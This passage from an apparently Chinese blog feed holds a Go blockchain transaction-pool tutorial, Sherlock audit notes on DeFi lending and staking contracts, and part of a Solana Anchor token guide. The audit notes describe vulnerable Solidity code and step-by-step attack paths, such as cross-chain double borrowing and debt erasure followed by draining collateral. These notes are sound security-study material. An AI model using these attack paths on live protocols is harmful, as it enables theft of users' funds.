<span class="number">0</span> &#123;</span><br><span class="line">last := blks[<span class="built_in">len</span>(blks)<span class="number">-1</span>]</span><br><span class="line">nonce = last.Nonce()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> tx.Nonce() &gt; nonce+<span class="number">1</span> &#123;</span><br><span class="line">pool.addQueue(tx)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> tx.Nonce() == nonce+<span class="number">1</span> &#123;</span><br><span class="line"><span class="comment">//push</span></span><br><span class="line">pool.pushpending(blks, tx)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//替换</span></span><br><span class="line">pool.replacePending(blks, tx)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok,此时，我们就实现<code>pending</code>,<code>queue</code>,替换的逻辑就可以了</p><p><strong>pending</strong></p><p>实际上就是把交易 <code>tx </code>插入到<code> pending</code> 区中，并更新全局交易列表<code> pool.txs</code>，同时保持按 <code>GasPrice</code> 高优先顺序。</p><p>首先判断你要插入的<code>blks</code>盒子数组是否为空，如果为首次插入，则创建一个新的<code>blk</code>单个盒子,把交易放入，再把这个<code>blk</code>放入<code>blks</code>,更新<code>pending</code>，此时我们的交易列表txs也要更新,最后再排序。</p><p>我们在go语言中的排序，是需要实现这三个结构，就可以直接使用了</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p pendingTxs)</span></span> Len() <span class="type">int</span> &#123; <span class="keyword">return</span> <span class="built_in">len</span>(p) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p pendingTxs)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">return</span> p[i].GasPrice() &lt; p[j].GasPrice()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p pendingTxs)</span></span> Swap(i, j <span class="type">int</span>) &#123; p[i], p[j] = p[j], p[i] &#125;</span><br></pre></td></tr></table></figure><p>比较在交易列表<code>txs</code>，比较每个盒子第一个交易的<code>gas</code>值大小，然后再排序</p><p>当<code>blks</code>为空的情况下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(blks) == <span class="number">0</span> &#123;</span><br><span class="line">blk := <span class="built_in">make</span>(DefaultSortedTxs, <span class="number">0</span>)      <span class="comment">// 创建一个新的交易块（空切片）</span></span><br><span class="line">blk = <span class="built_in">append</span>(blk, tx)                 <span class="comment">// 添加交易 tx 到这个块中</span></span><br><span class="line">blks = <span class="built_in">append</span>(blks, blk)             <span class="comment">// 把这个块添加到当前账户的交易组中</span></span><br><span class="line">pool.pendings[tx.From()] = blks      <span class="comment">// 写入 pending map（账户 =&gt; 交易块列表）</span></span><br><span class="line">pool.txs = <span class="built_in">append</span>(pool.txs, blk)     <span class="comment">// 全局交易池中也追加该块</span></span><br><span class="line">sort.Sort(pool.txs)                  <span class="comment">// 重新按 gasPrice 排序</span></span><br></pre></td></tr></table></figure><p>如果已经存在<code>blks</code>了，就拿出该地址的最后一个盒子</p><ul><li>先判断是否gas是否合理，合理就直接调用的盒子<code>push</code></li><li>如果不合理，就还是的新建一个<code>blk</code>,逻辑和上面一样</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">last := blks[<span class="built_in">len</span>(blks)<span class="number">-1</span>]             <span class="comment">// 拿出当前账户最后一个交易块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> last.GasPrice() &lt;= tx.GasPrice() &#123;</span><br><span class="line">last.Push(tx)                     <span class="comment">// 如果 gasPrice 合理，直接推入该块</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">blk := <span class="built_in">make</span>(DefaultSortedTxs, <span class="number">0</span>) <span class="comment">// 否则创建新的交易块</span></span><br><span class="line">blk = <span class="built_in">append</span>(blk, tx)</span><br><span class="line">blks = <span class="built_in">append</span>(blks, blk)</span><br><span class="line">pool.pendings[tx.From()] = blks</span><br><span class="line">pool.txs = <span class="built_in">append</span>(pool.txs, blk)</span><br><span class="line">sort.Sort(pool.txs)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>queue</strong>:把当前交易 <code>tx </code>放入 当前账户的 <code>Queue </code>队列 中，并按照<code> Nonce</code> 升序排序</p><p>首先根据我们设计<code>queue map</code>的结构，取交易账户的<code>queue</code>队列，直接把这个交易放入该队列，再按照<code>nonce</code>从小到大排序再更新<code>queue</code>队列</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool DefaultPool)</span></span> addQueue(tx *types.Transaction) &#123;</span><br><span class="line">list := pool.queued[tx.From()]</span><br><span class="line">list = <span class="built_in">append</span>(list, tx)</span><br><span class="line"><span class="comment">//sort</span></span><br><span class="line">sort.Slice(list, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">return</span> list[i].Nonce() &lt; list[j].Nonce()</span><br><span class="line">&#125;)</span><br><span class="line">pool.queued[tx.From()] = list</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>替换是出现在pending时</strong>，就是<code>nonce</code>符合<code>pending</code>队列，如果此时<code>pending</code>中有相同的<code>nonce</code>的交易，但是这个交易的<code>gas</code>小于要放入的交易，此时就发生替换</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool DefaultPool)</span></span> replacePending(blks []SortedTxs, tx *types.Transaction) &#123;</span><br><span class="line"><span class="keyword">for</span> _, blk := <span class="keyword">range</span> blks &#123;</span><br><span class="line"><span class="keyword">if</span> blk.Nonce() &gt;= tx.Nonce() &#123;</span><br><span class="line"><span class="comment">//替换</span></span><br><span class="line">blk.Replace(tx)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>pending</code> 区查找是否已有相同 <code>nonce</code> 的交易，如果有就尝试替换（通常是 <code>gasPrice</code> 更高的新交易）,因为是在盒子里替换，所以我们可以在盒子的接口再实现一个替换的逻辑，这样就可以直接可以直接利用</p><p><strong>盒子</strong>：给刚设计盒子接口的添加一个替换</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> SortedTxs <span class="keyword">interface</span> &#123;</span><br><span class="line">GasPrice() <span class="type">uint64</span></span><br><span class="line">Push(tx *types.Transaction)</span><br><span class="line">Replace(tx *types.Transaction)</span><br><span class="line">Pop() *types.Transaction</span><br><span class="line">Nonce() <span class="type">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们再实现这个<code>Replace</code>的逻辑</p><p>历遍这个盒子 ，找到<code>nonce</code>值相同的交易，再比较<code>gas</code>大小，大的就直接发生替换，如果没有找到相同的<code>nonce</code>交易，就直接添加在这个盒子的后面就可以了，</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sorted DefaultSortedTxs)</span></span> Replace(tx *types.Transaction) &#123;</span><br><span class="line"><span class="keyword">for</span> i, t := <span class="keyword">range</span> sorted &#123;</span><br><span class="line"><span class="keyword">if</span> t.Nonce() == tx.Nonce() &#123;</span><br><span class="line"><span class="keyword">if</span> tx.GasPrice() &gt; t.GasPrice() &#123;</span><br><span class="line">sorted[i] = tx</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="comment">// 不管是否替换，都 return，避免重复添加</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 没找到，append 并按 nonce 升序排序</span></span><br><span class="line">sorted = <span class="built_in">append</span>(sorted, tx)</span><br><span class="line">sort.Slice(sorted, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">return</span> sorted[i].Nonce() &lt; sorted[j].Nonce()</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再实现剩下的<code>txpool</code>的接口，根据功能依次实现。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool *DefaultPool)</span></span> Pop() *types.Transaction &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pool.txs) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 取全池中 gasPrice 最高的 DefaultSortedTxs</span></span><br><span class="line">block := pool.txs[<span class="built_in">len</span>(pool.txs)<span class="number">-1</span>]</span><br><span class="line">tx := block.Pop()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果 block 为空，移除</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(*block.(*DefaultSortedTxs)) == <span class="number">0</span> &#123;</span><br><span class="line">pool.txs = pool.txs[:<span class="built_in">len</span>(pool.txs)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tx</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool *DefaultPool)</span></span> SetStatRoot(root hash.Hash) &#123;</span><br><span class="line">pool.StatDB.SetRoot(root)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewDefaultPool</span><span class="params">(stat statdb.StatDB)</span></span> *DefaultPool &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;DefaultPool&#123;</span><br><span class="line">StatDB:   stat,</span><br><span class="line">all:      <span class="built_in">make</span>(<span class="keyword">map</span>[hash.Hash]<span class="type">bool</span>),</span><br><span class="line">txs:      <span class="built_in">make</span>(pendingTxs, <span class="number">0</span>),</span><br><span class="line">pendings: <span class="built_in">make</span>(<span class="keyword">map</span>[types.Address][]SortedTxs),</span><br><span class="line">queued:   <span class="built_in">make</span>(<span class="keyword">map</span>[types.Address][]*types.Transaction),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个交易池就设计好了，基本上就是一个单机版的区块链了。</p><h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><h2 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-Usual ETH0</title>
      <link href="/2025/06/10/sherlock-Usual-ETH0/"/>
      <url>/2025/06/10/sherlock-Usual-ETH0/</url>
      
        <content type="html"><![CDATA[<h2 id="sherlock-Usual-ETH0"><a href="#sherlock-Usual-ETH0" class="headerlink" title="sherlock-Usual ETH0"></a>sherlock-Usual ETH0</h2><p>这是一个关于代币质押与兑换的合约</p><h2 id="移除某些质押代币后，导致某些函数功能不能使用"><a href="#移除某些质押代币后，导致某些函数功能不能使用" class="headerlink" title="移除某些质押代币后，导致某些函数功能不能使用"></a>移除某些质押代币后，导致某些函数功能不能使用</h2><p>因为某些函数（swap等）利用的数组来实现历遍质押代币，有些条件判断了质押代币不能为零，如果某些代币被移除后，那么整个函数就会被revert.</p><h2 id="精度的问题，四舍五入，向下取整，多层函数实现的"><a href="#精度的问题，四舍五入，向下取整，多层函数实现的" class="headerlink" title="精度的问题，四舍五入，向下取整，多层函数实现的"></a>精度的问题，四舍五入，向下取整，多层函数实现的</h2><p>向下取整后，又作为分母，导致差值越来越大<br>建议给分母加一消除向下取整</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wadTokenAmountForPrice(uint256 wadStableAmount, uint256 wadPrice, uint8 tokenDecimals)</span><br><span class="line">    internal</span><br><span class="line">    pure</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">+    return Math.mulDiv(wadStableAmount, 10 ** tokenDecimals, wadPrice + 1, Math.Rounding.Floor);</span><br><span class="line">-    return Math.mulDiv(wadStableAmount, 10 ** tokenDecimals, wadPrice, Math.Rounding.Floor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="前置攻击"><a href="#前置攻击" class="headerlink" title="前置攻击"></a>前置攻击</h2><p>合约中没有为 wstETH 和其他 LST（流动性质押代币） 设置链上的价格偏离阈值检查机制。当这些代币价格偏离预期区间时，合约不会自动暂停或回滚交易。</p><p>缓解方案<br>必须在链上实现 LST 的价格偏离检查机制，仅靠链下监控 + 提交交易是不安全的，因为交易提交后未必能立刻执行，容易被前置交易。</p><p>方案一：与市场价格交叉验证<br>在 <code>AbstractOracle.getPrice()</code> 或 <code>_checkDepegPrice()</code> 中引入机制：</p><p>若 wstETH 的链上市场价格（例如 Chainlink 报价）与 Oracle 汇率价格偏差超过某个阈值，自动中止交易。</p><p>例如 Chainlink 的 wstETH 报价跌至 0.5，而 stEthPerToken() 仍为 1.2，可判定为异常，直接回滚交易。</p><p>此方式能防止因 LIDO Oracle 延迟而导致的套利攻击。</p><p>方案二：与预期价格增长幅度交叉验证<br>参考 AAVE 的做法：</p><p>LST 年化收益大致为 5%，若某时返回的汇率远高于或低于这一合理增长区间，可能意味着价格被操纵或系统出现异常。</p><p>在这种情况下，可以启用价格上限（如 AAVE 中的 maxRatio）或直接暂停操作。</p><p>提供一个参考的机制，</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-LEND</title>
      <link href="/2025/06/04/sherlock-LEND/"/>
      <url>/2025/06/04/sherlock-LEND/</url>
      
        <content type="html"><![CDATA[<h1 id="sherlock-LEND"><a href="#sherlock-LEND" class="headerlink" title="sherlock-LEND"></a>sherlock-LEND</h1><p>这是一个关于跨链的借贷，那么漏洞点就是在跨链的处理上</p><h2 id="高gas费用阻碍从边界用户退出质押"><a href="#高gas费用阻碍从边界用户退出质押" class="headerlink" title="高gas费用阻碍从边界用户退出质押"></a>高gas费用阻碍从边界用户退出质押</h2><p>原因就是使用数组记录数据，并且没有限制，导致gas线性增加，用户支付不了，退出质押<br>代码漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 遍历数组确定相关层级变更区间  </span><br><span class="line">for (uint256 i = 0; i &lt; userTierHistory.length; i++) &#123;  </span><br><span class="line">    if (userTierHistory[i].timestamp &lt;= fromTime) &#123;  </span><br><span class="line">        currentTier = userTierHistory[i].to;  </span><br><span class="line">        relevantStartIndex = i;  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        break;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">// 计算区间内各层级的利息  </span><br><span class="line">for (uint256 i = relevantStartIndex + 1; i &lt; userTierHistory.length; i++) &#123;  </span><br><span class="line">    if (userTierHistory[i].timestamp &gt;= toTime) break;  </span><br><span class="line">    // 解析时间段、层级及APY，计算利息  </span><br><span class="line">    uint256 periodInterest = ((user.balance * apy * (periodEnd - periodStart)) / (SECONDS_IN_YEAR * PRECISION)) / 100;  </span><br><span class="line">    totalInterest += periodInterest;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>数组长度越大，循环次数越多，gas 消耗呈线性增长，直至超过用户愿意支付的成本。</p><h2 id="跨链操作引发的漏洞，跨链借贷使用同一种抵押物"><a href="#跨链操作引发的漏洞，跨链借贷使用同一种抵押物" class="headerlink" title="跨链操作引发的漏洞，跨链借贷使用同一种抵押物"></a>跨链操作引发的漏洞，跨链借贷使用同一种抵押物</h2><p>若未在源链锁定抵押品，协议将面临抵押不足的债务风险。借款人可在跨链借贷完成前提取或重复使用同一抵押品，从而实现跨链超额借贷。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function borrowCrossChain(...) &#123;  </span><br><span class="line">    // 仅发送跨链消息，未锁定抵押品  </span><br><span class="line">    sendLayerZeroMessage(...);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>攻击者在链 B 获取借贷资金的同时，已提空链 A 抵押品，导致协议遭受全额资金损失。</p><h2 id="跨链检查条件错误，源链和目标链匹配错误"><a href="#跨链检查条件错误，源链和目标链匹配错误" class="headerlink" title="跨链检查条件错误，源链和目标链匹配错误"></a>跨链检查条件错误，源链和目标链匹配错误</h2><p>计算跨链抵押品生息债务的条件检查错误地要求源链 ID（srcEid）和目标链 ID（destEid）均匹配当前链 ID（currentEid）。然而，对于跨链借贷场景，源链与目标链必然不同，导致borrowedAmount被计算为 0，最终阻断债务偿还流程。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function borrowWithInterest(...) public view returns (uint256) &#123;  </span><br><span class="line">    // ...  </span><br><span class="line">    for (uint256 i = 0; i &lt; collaterals.length; i++) &#123;  </span><br><span class="line">        // 错误要求源链和目标链均等于当前链  </span><br><span class="line">        if (collaterals[i].destEid == currentEid &amp;&amp; collaterals[i].srcEid == currentEid) &#123;  </span><br><span class="line">            borrowedAmount += (...);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    // ...  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>跨链借贷的srcEid与destEid必然不同（例如源链为 A，目标链为 B），而currentEid仅为其中一条链（如 B），导致条件永远不成立，borrowedAmount始终为 0。</p><h2 id="未扣除同一抵押物，用户可以在多条链上反复重复借贷"><a href="#未扣除同一抵押物，用户可以在多条链上反复重复借贷" class="headerlink" title="未扣除同一抵押物，用户可以在多条链上反复重复借贷"></a>未扣除同一抵押物，用户可以在多条链上反复重复借贷</h2><p>发起跨链借贷时，源链仅向目标链发送原始抵押品价值，未扣除用户已存在的借贷金额。这使得用户可利用同一抵押品在多条链上重复借贷，导致系统性抵押不足风险。</p><p>大概的攻击路径：</p><ul><li>抵押品存入与首次借贷：<ul><li>用户在链 A 存入 1000 USDC（抵押率 80%，对应 800 美元借贷额度）。</li><li>在链 A 借贷 600 USDT，剩余可用额度 200 美元。</li></ul></li><li>跨链借贷发起：<ul><li>用户从链 A 调用borrowCrossChain向链 B 借贷 700 USDT。</li><li>源链计算抵押品为 800 美元（未扣除已借贷的 600 美元），并将该值发送至链 B。</li><li>链 B 接收到 800 美元抵押品值，允许借贷 700 USDT（因验证条件为抵押品 ≥ 借贷金额）。</li></ul></li><li>结果：<ul><li>用户累计借贷 1300 美元（600+700），但实际可用抵押品额度仅 800 美元（利用率 162.5%）。</li></ul></li></ul><h2 id="领取奖励后，要更新余额，不然会导致重复领取"><a href="#领取奖励后，要更新余额，不然会导致重复领取" class="headerlink" title="领取奖励后，要更新余额，不然会导致重复领取"></a>领取奖励后，要更新余额，不然会导致重复领取</h2><p>grantLendInternal()函数虽成功转移代币，但返回的剩余金额（成功时为 0）未被使用。这意味着lendStorage.lendAccrued[holders[j]]仍保留原值，用户可再次申领。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (uint256 j = 0; j &lt; holders.length;) &#123;  </span><br><span class="line">    uint256 accrued = lendStorage.lendAccrued(holders[j]);  </span><br><span class="line">    if (accrued &gt; 0) &#123;  </span><br><span class="line">        grantLendInternal(holders[j], accrued); // 转移代币但未重置余额  </span><br><span class="line">    &#125;  </span><br><span class="line">    unchecked &#123;  </span><br><span class="line">        ++j;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h2 id="使用的历史利息错误"><a href="#使用的历史利息错误" class="headerlink" title="使用的历史利息错误"></a>使用的历史利息错误</h2><p>exchangeRateStored仅反映历史汇率，未通过accrueInterest()更新应计利息，而exchangeRateCurrent才是包含实时利息的正确汇率。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 exchangeRateBefore = LTokenInterface(_lToken).exchangeRateStored();  </span><br></pre></td></tr></table></figure><h2 id="错误的清算"><a href="#错误的清算" class="headerlink" title="错误的清算"></a>错误的清算</h2><p>清算权限判断逻辑错误地将全局借款金额与市场特定的借款指数比值相乘：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 borrowedAmount =  </span><br><span class="line">    (borrowed * uint256(LTokenInterface(lTokenBorrowed).borrowIndex())) / borrowBalance.borrowIndex;</span><br><span class="line"></span><br><span class="line">require(borrowedAmount &gt; collateral, &quot;Insufficient shortfall&quot;);</span><br></pre></td></tr></table></figure><p>然而 getHypotheticalAccountLiquidityCollateral 函数返回的 borrowed 已经是用户在所有市场中的全局债务值，并已经包含利息。因此不应再额外缩放 borrow index，否则就会导致与抵押品价值的不一致比较。</p><h2 id="借款时使用了错误的借款指数"><a href="#借款时使用了错误的借款指数" class="headerlink" title="借款时使用了错误的借款指数"></a>借款时使用了错误的借款指数</h2><p>对于跨链借款，其利息应使用目标链（目的链）借款市场的 borrowIndex 进行计算。但当前实现中，错误地使用了源链的 borrowIndex。由于不同链的市场启动时间、借款活跃度和利率差异，这些指数可能会相差很大。</p><h2 id="错误更新借款状态"><a href="#错误更新借款状态" class="headerlink" title="错误更新借款状态"></a>错误更新借款状态</h2><p>在跨链中，不应该只考虑在跨链的操作，如果在本链还有借贷物，就会被一起抵消、</p><p>攻击路径：</p><ul><li><p>攻击者在链 A 上调用 CoreRouter::supply 供应一点点资产作为抵押；</p></li><li><p>调用 CrossChainRouter::borrowCrossChain 发起一次小额的跨链借款（目标链是链 B）；</p></li><li><p>跨链借款成功后，攻击者前往链 B；</p></li><li><p>在链 B 上再次调用 CoreRouter::supply 和 CoreRouter::borrow 借更多资产；</p></li><li><p>调用 CrossChainRouter::repayCrossChainBorrow，还清那笔小额跨链借款；</p></li><li><p>此时协议会把攻击者在链 B 的借款记录清零，尽管他实际上还欠一堆钱；</p></li><li><p>攻击者调用 CoreRouter::redeem，把他在链 B 所有的抵押品都提走；</p></li><li><p>协议被洗劫，所有流动性被清空。</p></li></ul><h2 id="跨链借贷，在本链的抵押物没有被锁定，导致本链可以使用，跨链也可以使用"><a href="#跨链借贷，在本链的抵押物没有被锁定，导致本链可以使用，跨链也可以使用" class="headerlink" title="跨链借贷，在本链的抵押物没有被锁定，导致本链可以使用，跨链也可以使用"></a>跨链借贷，在本链的抵押物没有被锁定，导致本链可以使用，跨链也可以使用</h2><p>在 CrossChainRouter.sol 的 borrowCrossChain() 函数中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lendStorage.addUserSuppliedAsset(msg.sender, _lToken);</span><br></pre></td></tr></table></figure><p>这句只是记录了用户的抵押品信息，但没有锁定这部分抵押资产。</p><p>然后协议通过 <code>_send()</code> 向目标链发送跨链消息，但 在消息尚未被处理前，用户仍然可以在源链操作这些抵押资产。</p><p>在 CoreRouter.sol 中的 redeem() 函数中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(uint256 borrowed, uint256 collateral) = </span><br><span class="line">    lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), _amount, 0);</span><br><span class="line">require(collateral &gt;= borrowed, &quot;Insufficient liquidity&quot;);</span><br></pre></td></tr></table></figure><p>这里的流动性检查只检查了当前链上的借款情况，并未考虑正在跨链进行中的借款请求。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Anchor 与 SPL Token Program 交互指南</title>
      <link href="/2025/06/01/%E4%BD%BF%E7%94%A8-Anchor-%E4%B8%8E-SPL-Token-Program-%E4%BA%A4%E4%BA%92%E6%8C%87%E5%8D%97/"/>
      <url>/2025/06/01/%E4%BD%BF%E7%94%A8-Anchor-%E4%B8%8E-SPL-Token-Program-%E4%BA%A4%E4%BA%92%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="使用Anchor与SPL-Token-Program交互指南"><a href="#使用Anchor与SPL-Token-Program交互指南" class="headerlink" title="使用Anchor与SPL Token Program交互指南"></a>使用Anchor与SPL Token Program交互指南</h1><p><strong>Anchor</strong> 是用来开发 Solana 智能合约的高层开发框架，它基于 Rust，简化了 Solana 原生开发的繁琐流程。<br><strong>SPL</strong> 是 <code>Solana Program Library</code> 的缩写,它是Solana官方维护的一套标准智能合约程序集合，用来为 Solana 生态提供各种 <strong>基础功能模块</strong>，类似于以太坊里的 ERC标准合约。</p><h2 id="创建Token-Mint"><a href="#创建Token-Mint" class="headerlink" title="创建Token Mint"></a>创建Token Mint</h2><p>首先要了解什么是Mint账户，简单来说，Mint 账户就是某个代币的“发行登记中心”，负责记录这个代币的总发行量、精度、小数位，以及谁有权限铸造（mint）或销毁（burn）它，所以它的结构就非常的清晰了，如下：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Mint</span> &#123;</span><br><span class="line">    <span class="comment">/// 用于铸造新token的可选权限。mint权限只能在mint创建期间提供。</span></span><br><span class="line">    <span class="comment">/// 如果没有mint权限，则mint具有固定的供应量，并且无法铸造更多的token。</span></span><br><span class="line">    <span class="keyword">pub</span> mint_authority: COption&lt;Pubkey&gt;,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/// token的总供应量。</span></span><br><span class="line">    <span class="keyword">pub</span> supply: <span class="type">u64</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/// 小数点右侧的十进制位数。</span></span><br><span class="line">    <span class="keyword">pub</span> decimals: <span class="type">u8</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/// 如果此结构已初始化，则为`true`</span></span><br><span class="line">    <span class="keyword">pub</span> is_initialized: <span class="type">bool</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/// 用于冻结token账户的可选权限。</span></span><br><span class="line">    <span class="keyword">pub</span> freeze_authority: COption&lt;Pubkey&gt;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用<code>anchor-spl crate</code>中的<code>token_interface</code>模块来与<code>Token Program</code>和<code>Token Extension Program</code>进行交互，以下是个简单的模板：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> anchor_spl::token_interface::&#123;Mint, TokenInterface&#125;; <span class="comment">// 引入 Mint 账户类型和 Token 接口定义</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Accounts)]</span> <span class="comment">// 自动为该结构生成账户验证与解包逻辑</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">CreateMint</span>&lt;<span class="symbol">&#x27;info</span>&gt; &#123;</span><br><span class="line">    <span class="meta">#[account(mut)]</span> <span class="comment">// signer 是一个可变账户</span></span><br><span class="line">    <span class="keyword">pub</span> signer: Signer&lt;<span class="symbol">&#x27;info</span>&gt;, <span class="comment">// 调用者的钱包地址，需要签名</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#[account(</span></span><br><span class="line"><span class="meta">        init, // 创建一个新账户</span></span><br><span class="line"><span class="meta">        payer = signer, // signer 将为创建 mint 支付租金（SOL）</span></span><br><span class="line"><span class="meta">        mint::decimals = 6, // 设置 token 的最大小数位为 6 位</span></span><br><span class="line"><span class="meta">        mint::authority = signer.key(), // 设置 signer 为 mint 的铸造权限地址</span></span><br><span class="line"><span class="meta">        mint::freeze_authority = signer.key(), // 设置 signer 为冻结权限地址</span></span><br><span class="line"><span class="meta">    )]</span></span><br><span class="line">    <span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, Mint&gt;, <span class="comment">// 创建一个新的 SPL Token Mint 账户（使用通用接口封装）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> token_program: Interface&lt;<span class="symbol">&#x27;info</span>, TokenInterface&gt;, <span class="comment">// 传入的 SPL Token Program（支持多实现）</span></span><br><span class="line">    <span class="keyword">pub</span> system_program: Program&lt;<span class="symbol">&#x27;info</span>, System&gt;, <span class="comment">// 系统程序，用于创建账户和支付租金</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>**#[account(…)]**是一个 属性宏语法块, Anchor 框架扩展定义用来给紧随其后的账户字段添加 初始化规则或约束条件,在上面模板中就是一个账户的约束。</p></blockquote><p>当然在创建mint账户时，也可以使用PDA作为你的 <code>mint::authority</code>，那么可以让你的程序控制这个Token的铸造权限，而不是由某个外部用户来控制。创建地址如下：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[account(</span></span><br><span class="line"><span class="meta">    init,                    // 初始化一个新的账户</span></span><br><span class="line"><span class="meta">    payer = signer,          // 由 signer 支付租金（SOL）</span></span><br><span class="line"><span class="meta">    mint::decimals = 6,      // 设置代币小数位数为6</span></span><br><span class="line"><span class="meta">    mint::authority = mint.key(),         // 设置铸造权限为mint账户本身（PDA）</span></span><br><span class="line"><span class="meta">    mint::freeze_authority = mint.key(),  // 设置冻结权限为mint账户本身（PDA）</span></span><br><span class="line"><span class="meta">    seeds = [b<span class="string">&quot;mint&quot;</span>]</span>,       <span class="comment">// 用固定种子 &quot;mint&quot; 派生PDA</span></span><br><span class="line">    bump                     <span class="comment">// 使用 bump 种子，防止哈希碰撞,使PDA合法</span></span><br><span class="line">)]</span><br><span class="line"><span class="keyword">pub</span> mint: InterfaceAccount&lt;<span class="symbol">&#x27;info</span>, 